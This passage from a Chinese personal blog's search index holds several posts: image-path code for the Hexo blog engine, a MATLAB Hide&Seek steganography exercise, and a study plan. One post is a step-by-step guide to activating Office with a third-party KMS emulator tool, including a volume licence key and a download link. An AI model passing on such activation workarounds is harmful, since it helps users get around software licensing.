class="title">for</span>(<span class="params"><span class="keyword">var</span> i = <span class="number">0</span>; i &lt; toprocess.length; i++</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">var</span> key = toprocess[i];</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">var</span> $ = cheerio.load(data[key], &#123;</span><br><span class="line">        ignoreWhitespace: <span class="literal">false</span>,</span><br><span class="line">        xmlMode: <span class="literal">false</span>,</span><br><span class="line">        lowerCaseTags: <span class="literal">false</span>,</span><br><span class="line">        decodeEntities: <span class="literal">false</span></span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      $(<span class="string">&#x27;img&#x27;</span>).each(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span> ($(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>))&#123;</span><br><span class="line"><span class="comment">// For windows style path, we replace &#x27;\&#x27; to &#x27;/&#x27;.</span></span><br><span class="line"><span class="keyword">var</span> src = $(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>).replace(<span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="regexp">/http[s]*.*|\/\/.*/</span>.test(src) &amp;&amp;</span><br><span class="line">   !<span class="regexp">/^\s*\//</span>.test(src)) &#123;</span><br><span class="line">  <span class="comment">// For &quot;about&quot; page, the first part of &quot;src&quot; can&#x27;t be removed.</span></span><br><span class="line">  <span class="comment">// In addition, to support multi-level local directory.</span></span><br><span class="line">  <span class="keyword">var</span> linkArray = link.split(<span class="string">&#x27;/&#x27;</span>).filter(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">var</span> srcArray = src.split(<span class="string">&#x27;/&#x27;</span>).filter(<span class="function"><span class="keyword">function</span>(<span class="params">elem</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> elem != <span class="string">&#x27;&#x27;</span> &amp;&amp; elem != <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span>(srcArray.length &gt; <span class="number">1</span>)</span><br><span class="line">srcArray.shift();</span><br><span class="line">  src = srcArray.join(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">  $(<span class="built_in">this</span>).attr(<span class="string">&#x27;src&#x27;</span>, config.root + link + src);</span><br><span class="line">  <span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info(<span class="string">&quot;update link as:--&gt;&quot;</span>+config.root + link + src);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info(<span class="string">&quot;no src attr, skipped...&quot;</span>);</span><br><span class="line"><span class="built_in">console</span>.info&amp;&amp;<span class="built_in">console</span>.info($(<span class="built_in">this</span>));</span><br><span class="line">&#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      data[key] = $.html();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>大佬的原文链接：<a href="https://blog.csdn.net/xjm850552586/article/details/84101345">https://blog.csdn.net/xjm850552586/article/details/84101345</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用KMS激活Office</title>
      <link href="2019/10/14/KMS%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/"/>
      <url>2019/10/14/KMS%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>KMS技术是通过Key Manager Service服务的激活机制来激活Windows或者office的，能获取正版的产品密钥，不过密钥有有效期，不是永久的，所以等到有效期到了之后需要重新获取密钥。相比网上的一些破解软件来说要好的多。</p><h4 id="1-打开最新的KMS-Tools-by-Ratiborus-会出现多个应用选项。"><a href="#1-打开最新的KMS-Tools-by-Ratiborus-会出现多个应用选项。" class="headerlink" title="1. 打开最新的KMS Tools by Ratiborus,会出现多个应用选项。"></a>1. 打开最新的KMS Tools by Ratiborus,会出现多个应用选项。</h4><p><img src="https://img-blog.csdnimg.cn/20191014203629977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xwbHA5ODIy,size_16,color_FFFFFF,t_70" alt="KMS 界面"></p><h4 id="2-点击”KMSoffline”-进入KMSoffline-x64-v2-1-3界面-有Main、Tools-andSettings、About四个菜单选项。"><a href="#2-点击”KMSoffline”-进入KMSoffline-x64-v2-1-3界面-有Main、Tools-andSettings、About四个菜单选项。" class="headerlink" title="2. 点击”KMSoffline”,进入KMSoffline x64 v2.1.3界面,有Main、Tools andSettings、About四个菜单选项。"></a>2. 点击”KMSoffline”,进入KMSoffline x64 v2.1.3界面,有Main、Tools andSettings、About四个菜单选项。</h4><p><img src="https://img-blog.csdnimg.cn/20191014203712167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xwbHA5ODIy,size_16,color_FFFFFF,t_70" alt="KMSOffice"></p><h4 id="3-在下方”Product”处，可以选择激活Windows和office-当然office需要自己安装。"><a href="#3-在下方”Product”处，可以选择激活Windows和office-当然office需要自己安装。" class="headerlink" title="3. 在下方”Product”处，可以选择激活Windows和office,当然office需要自己安装。"></a>3. 在下方”Product”处，可以选择激活Windows和office,当然office需要自己安装。</h4><p><img src="https://img-blog.csdnimg.cn/20191014203751419.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xwbHA5ODIy,size_16,color_FFFFFF,t_70" alt="选择Product"></p><h4 id="4-然后点击右下方的”Information”可以查看Windows的版本信息或者office的版本信息，查看是否激活，有效期（）等什么的："><a href="#4-然后点击右下方的”Information”可以查看Windows的版本信息或者office的版本信息，查看是否激活，有效期（）等什么的：" class="headerlink" title="4. 然后点击右下方的”Information”可以查看Windows的版本信息或者office的版本信息，查看是否激活，有效期（）等什么的："></a>4. 然后点击右下方的”Information”可以查看Windows的版本信息或者office的版本信息，查看是否激活，有效期（）等什么的：</h4><p><img src="https://img-blog.csdnimg.cn/2019101420382834.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xwbHA5ODIy,size_16,color_FFFFFF,t_70" alt="查询信息"><br>   例如：下方是Windows的信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  &#x3D;&#x3D; Windows(R), ProfessionalWorkstation edition</span><br><span class="line">     Windows(R) Operating System, VOLUME_KMSCLIENT channel</span><br><span class="line">                          SKU ID: 82bbc092-bc50-4e16-8e18-b74fc486aec3</span><br><span class="line">    Partial Product Key: 6Q84J</span><br><span class="line">    KMS-host Machine: </span><br><span class="line">          KMS-Server PID: 03612-00206-557-633704-03-2052-17763.0000-1232019</span><br><span class="line">Expiration Date&#x2F;Time: 179.20:24,  until 2020&#x2F;4&#x2F;11   &#x2F;&#x2F;这里显示到2020&#x2F;04&#x2F;11过期。</span><br><span class="line">      Activation interval: 00.02:00</span><br><span class="line">         Renewal interval: 16.04:23</span><br><span class="line">             License Status: --- LICENSED ---</span><br><span class="line">      ---------------------------------------</span><br></pre></td></tr></table></figure><h4 id="5-所以”Product”选择office，查看信息，确定office版本，点击”Install-Key”-生成产品密钥，中间的白框框中就会出现提示信息，"><a href="#5-所以”Product”选择office，查看信息，确定office版本，点击”Install-Key”-生成产品密钥，中间的白框框中就会出现提示信息，" class="headerlink" title="5. 所以”Product”选择office，查看信息，确定office版本，点击”Install Key”,生成产品密钥，中间的白框框中就会出现提示信息，"></a>5. 所以”Product”选择office，查看信息，确定office版本，点击”Install Key”,生成产品密钥，中间的白框框中就会出现提示信息，</h4><p><img src="https://img-blog.csdnimg.cn/20191014203917105.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xwbHA5ODIy,size_16,color_FFFFFF,t_70" alt="Install Key"><br>最后的是密钥，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">       ---------------------------------------</span><br><span class="line"> &#x3D;&#x3D; Installation GVLK keys Office 19</span><br><span class="line">Install License:</span><br><span class="line">ProPlus2019VL_KMS_Client_AE-ppd.xrm-ms</span><br><span class="line">Install License:</span><br><span class="line">ProPlus2019VL_KMS_Client_AE-ul-oob.xrm-ms</span><br><span class="line">Install License:</span><br><span class="line">ProPlus2019VL_KMS_Client_AE-ul.xrm-ms</span><br><span class="line">Install License:</span><br><span class="line">ProPlus2019VL_MAK_AE-pl.xrm-ms</span><br><span class="line">Install License:</span><br><span class="line">ProPlus2019VL_MAK_AE-ppd.xrm-ms</span><br><span class="line">Install License:</span><br><span class="line">ProPlus2019VL_MAK_AE-ul-oob.xrm-ms</span><br><span class="line">Install License:</span><br><span class="line">ProPlus2019VL_MAK_AE-ul-phn.xrm-ms</span><br><span class="line">Uninstall key: 8MBCX</span><br><span class="line"></span><br><span class="line">Office 19, Office19ProPlus2019VL_KMS_Client_AE edition</span><br><span class="line">NMMKJ-6RK4F-KMJVX-8D9MJ-6MWKP &#x2F;&#x2F;这个是产品密钥</span><br></pre></td></tr></table></figure><h4 id="6-最后将上面的产品密钥复制到左下方的”Own-Key”中，点击右下方的”Activate”（激活）就可以激活了，"><a href="#6-最后将上面的产品密钥复制到左下方的”Own-Key”中，点击右下方的”Activate”（激活）就可以激活了，" class="headerlink" title="6. 最后将上面的产品密钥复制到左下方的”Own Key”中，点击右下方的”Activate”（激活）就可以激活了，"></a>6. 最后将上面的产品密钥复制到左下方的”Own Key”中，点击右下方的”Activate”（激活）就可以激活了，</h4><p>激活成功是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">       ---------------------------------------</span><br><span class="line">&#x3D;&#x3D; Activating Office 19, Office19ProPlus2019VL_KMS_Client_AE edition</span><br><span class="line"></span><br><span class="line"> Setting KMS-Service 10.3.0.20:1688 ...</span><br><span class="line"> KMS-Service 10.3.0.20:1688 successfully installed</span><br><span class="line"></span><br><span class="line"> Install KMS-Emulator ...</span><br><span class="line">              -------&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;-------</span><br><span class="line"> &#x3D;&#x3D;&#x3D; Product successfully activated &#x3D;&#x3D;&#x3D;</span><br><span class="line">              -------&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;-------</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><p>一个俄罗斯大牛写的，<a href="https://filecr.com/windows/ratiborus-kms-tools/">KMS Tools by Ratiborus</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KMS </tag>
            
            <tag> office </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019年下半年规划</title>
      <link href="2019/08/23/2019%E5%B9%B4%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%A7%84%E5%88%92/"/>
      <url>2019/08/23/2019%E5%B9%B4%E4%B8%8B%E5%8D%8A%E5%B9%B4%E8%A7%84%E5%88%92/</url>
      
        <content type="html"><![CDATA[<h3 id="学业"><a href="#学业" class="headerlink" title="学业"></a>学业</h3><ol><li>争取保研，现在的想法就保到本校吧，老师熟悉，环境熟悉，至于说出去闯的事，等十月份确定了之后，投投简历，找个实习，出去闯一闯。</li><li>现在大概率已经决定走逆向方向了，在实习期间一定要多学多问，下半年争取吃完《0day》和《加密与解密》这两本书。</li><li>渗透测试在我看来，还是挺有意思的，有空的话去试试关注的网站吧，毕竟现在了解的方面也算比较多了，尝试挖挖一些简单的漏洞。</li><li>和导师确定好方向之后要慢慢养成看论文的习惯。</li><li>在练习的英语口语也不要放弃，其实学习英语口语不可避免的学习英语的语法知识什么的，这次英语六级果然考砸了，下半年再去试试吧，顺便试试口试。</li></ol><h3 id="人际交往"><a href="#人际交往" class="headerlink" title="人际交往"></a>人际交往</h3><ol><li>多理解理解别人，不要把什么事都自己想当然；</li><li>对于自己喜欢的人，不强求吧，顺其自然，确实大四各自的去向也太不稳定了，当初想着趁着最后一年赶紧谈个恋爱的想法现在想来真是幼稚，要说大学三年在感情方面学到了什么，那就是认识到了很多优秀的人，不过在别人眼中我永远只是个好人！哈哈，不要悲伤，一两年之后回来再看就会觉得没什么了。</li><li>多和老师交流，要学会多问关键性的问题，少问人生规划类的问题，人生规划适合自己才行，大部分老师都是以自身经历来告诫学生。</li><li>人前要活泼、开朗，人后得学会自我提升、自我思考。</li></ol><h3 id="家人"><a href="#家人" class="headerlink" title="家人"></a>家人</h3><ol><li>国庆回家一趟，一个暑假没回去，我很想家，家人一定希望我回去的。</li><li>寒假回去记得和老哥说一下，一起去拍个全家福吧！</li><li>周末的时间抽空打个电话给妈妈，老爸和我从来都是只说正事，和妈妈能瞎扯很久，毕竟他们年纪大了，子女离那么远，内心肯定是孤独的。</li></ol><h3 id="金钱观"><a href="#金钱观" class="headerlink" title="金钱观"></a>金钱观</h3><ol><li>合理分配资金。</li><li>可以学一点投资的知识，把剩余的钱用来赚取其他利益。</li><li>学会投资在学习上，不管是专业学习，还是其他的生活技能的学习。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Thought </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 规划 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hide&amp;Seek Algorithm</title>
      <link href="2019/04/11/Hide&amp;Seek-Algorithm/"/>
      <url>2019/04/11/Hide&amp;Seek-Algorithm/</url>
      
        <content type="html"><![CDATA[<h3 id="1-Hide-amp-Seek-Algorithm"><a href="#1-Hide-amp-Seek-Algorithm" class="headerlink" title="1. Hide&amp;Seek Algorithm"></a>1. Hide&amp;Seek Algorithm</h3><p>通过减少调色板矩阵的颜色数，再复制增加一倍，再通过某种方法嵌入消息，这里是实现了将读入的图片的颜色减至128色，然后复制成为256色，这样数据索引矩阵中的值可以选择两个索引，一个小索引、一个大索引，使其分别代表不同的信息即可，例如0、1。关于调色板矩阵和索引矩阵可以看我上一篇文章。</p><h3 id="2-Code-Design"><a href="#2-Code-Design" class="headerlink" title="2. Code Design"></a>2. Code Design</h3><p>matlab不是我擅长的语言，hh，想想我也没什么擅长的语言！</p><h4 id="2-1-隐藏函数"><a href="#2-1-隐藏函数" class="headerlink" title="2.1 隐藏函数"></a>2.1 隐藏函数</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> [ <span class="title">newdata</span>, <span class="title">newmap</span> ] = <span class="title">MyHideSeek</span>(<span class="params"> data, map, msg </span>)</span></span><br><span class="line">%自我实现的最简单的Hide&amp;Seek算法</span><br><span class="line">%data:原始索引矩阵</span><br><span class="line">%map:原始调色板矩阵</span><br><span class="line">%msg:需要隐藏的消息</span><br><span class="line">newdata = data;</span><br><span class="line">newmap = [map;map];</span><br><span class="line">size_data = prod(size(data));</span><br><span class="line">len_msg = length(msg);%消息的长度</span><br><span class="line">lenstr = de2bi(len_msg, <span class="number">7</span>, <span class="number">2</span>);</span><br><span class="line">msgasc = double(msg);</span><br><span class="line">msgstr = de2bi(msgasc, <span class="number">7</span>, <span class="number">2</span>);</span><br><span class="line">msgstr = msgstr<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">len_map = length(map); %原始调色板的颜色个数</span></span><br><span class="line"><span class="string">if size_data &lt; 7*(len_msg+1)</span></span><br><span class="line"><span class="string">    error(&#x27;</span>The message is too long to embed!\n<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"><span class="string">%改变索引矩阵的值来隐藏信息</span></span><br><span class="line"><span class="string">%存入长度</span></span><br><span class="line"><span class="string">for i = 1:7</span></span><br><span class="line"><span class="string">    if lenstr(i) == 1       %规定消息为1时使用大的索引</span></span><br><span class="line"><span class="string">        newdata(i) = newdata(i) + len_map;</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"><span class="string">%存入msg</span></span><br><span class="line"><span class="string">for j = 8:7*(len_msg + 1)</span></span><br><span class="line"><span class="string">    if msgstr(j-7) == 1</span></span><br><span class="line"><span class="string">        newdata(j) = newdata(j) +len_map;</span></span><br><span class="line"><span class="string">    end</span></span><br><span class="line"><span class="string">end</span></span><br><span class="line"><span class="string">end</span></span><br></pre></td></tr></table></figure><h4 id="2-2-提取函数"><a href="#2-2-提取函数" class="headerlink" title="2.2 提取函数"></a>2.2 提取函数</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">msg</span> = <span class="title">MyHideSeekExtract</span>(<span class="params"> newdata, newmap </span>)</span></span><br><span class="line">%MyHideSeek提取函数</span><br><span class="line">%newdata:隐含信息的数据索引矩阵</span><br><span class="line">%newmap:复制后的调色板矩阵</span><br><span class="line">len_map = length(newmap)/<span class="number">2</span>;%原始map的长度</span><br><span class="line">len = zeros(<span class="number">1</span>,<span class="number">7</span>);%用来存放提取出来的消息长度</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">1</span>:<span class="number">7</span></span><br><span class="line">    <span class="keyword">if</span> newdata(i) &gt; len_map</span><br><span class="line">        len(i) = <span class="number">1</span>;</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">len = bi2de(len);</span><br><span class="line">msg = zeros(<span class="number">7</span>,len);</span><br><span class="line">%提取消息</span><br><span class="line"><span class="keyword">for</span> j = <span class="number">8</span>:<span class="number">7</span>*(len + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> newdata(j) &gt;len_map</span><br><span class="line">        msg(j-<span class="number">7</span>) = <span class="number">1</span>;</span><br><span class="line">    end</span><br><span class="line">end</span><br><span class="line">%将消息转为字符串</span><br><span class="line">msgasc = bi2de(msg<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">msg = char(msgasc);</span></span><br><span class="line"><span class="string">msg = msg&#x27;</span>;</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h4 id="2-3-测试脚本"><a href="#2-3-测试脚本" class="headerlink" title="2.3 测试脚本"></a>2.3 测试脚本</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">clear;</span><br><span class="line">im = imread(<span class="string">&#x27;comic.png&#x27;</span>);</span><br><span class="line">[data, map] = rgb2ind(im, <span class="number">128</span>); %将图片的颜色减少至<span class="number">128</span>色，由于数据索引矩阵的数据时uint8所以这里的最大为<span class="number">128</span>色，超过就无法还原了</span><br><span class="line">msg = <span class="string">&#x27;flag&#123;This_1s_for_my_Hide_&amp;_Seek.&#125;&#x27;</span>;</span><br><span class="line">[newdata, newmap] = MyHideSeek(data, map, msg);</span><br><span class="line">imshow(data, map);title(<span class="string">&#x27;Origin&#x27;</span>);</span><br><span class="line">figure;imshow(newdata, newmap); title(<span class="string">&#x27;Steg&#x27;</span>);</span><br><span class="line">flag = MyHideSeekExtract(newdata, newmap);</span><br><span class="line">fprintf(<span class="string">&#x27;flag:%s\n&#x27;</span>, flag);</span><br></pre></td></tr></table></figure><h3 id="3-测试结果"><a href="#3-测试结果" class="headerlink" title="3. 测试结果"></a>3. 测试结果</h3><p>比较前后两张图片，肉眼分别不出差异：<br><img src="https://img-blog.csdnimg.cn/20190411153722923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xwbHA5ODIy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>查看输出的文本信息：<br><img src="https://img-blog.csdnimg.cn/20190411153836836.png" alt="在这里插入图片描述"></p><hr><p>注：之前一直不清楚hide&amp;seek算法是什么，虽然拍了几张上课的照片，但是不懂，同学的提示让我突然想到了我拍的照片的含义，果然上课不好好听课是不行的，在此向她致谢~<br>hide&amp;seek算法还有其他的编码方式，这只是其中一种最简单的。关键在改变调色板矩阵之后的嵌入方式的选择，这是多样的。</p><p>ex: First posted in <a href="https://blog.csdn.net/lplp9822/article/details/89212456">CSDN blog</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础概念 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hide&amp;Seek </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>About</title>
      <link href="about/index.html"/>
      <url>about/index.html</url>
      
        <content type="html"><![CDATA[<h3 id="404"><a href="#404" class="headerlink" title="404"></a>404</h3><p>妈妈，我将变成一只萤火虫！</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Tags</title>
      <link href="tags/index.html"/>
      <url>tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Categories</title>
      <link href="categories/index.html"/>
      <url>categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
